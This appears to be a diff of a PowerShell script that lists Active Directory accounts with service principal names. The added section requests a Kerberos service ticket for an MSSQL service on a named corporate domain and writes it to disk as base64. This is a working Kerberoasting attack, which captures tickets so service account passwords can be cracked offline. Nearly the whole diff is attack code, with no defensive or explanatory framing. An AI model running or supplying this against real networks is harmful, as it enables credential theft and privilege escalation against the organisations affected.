@@ -10,3 +10,16 @@ $searcher2.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!userAccountCo
 $searcher2.FindAll() | ForEach-Object {
     "$($_.Properties['samaccountname']) — $($_.Properties['serviceprincipalname'])"
 }
+
+
+## TGS Request
+Add-Type -AssemblyName System.IdentityModel
+
+$spn = "MSSQLSvc/DLO.GREAVESCOTTON.COM:DLO8"
+
+$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+
+$ticketBytes = New-Object byte[] ($token.BinaryLength)
+$token.GetBinaryForm($ticketBytes, 0)
+
+[System.Convert]::ToBase64String($ticketBytes) | Out-File C:\ticket.b64
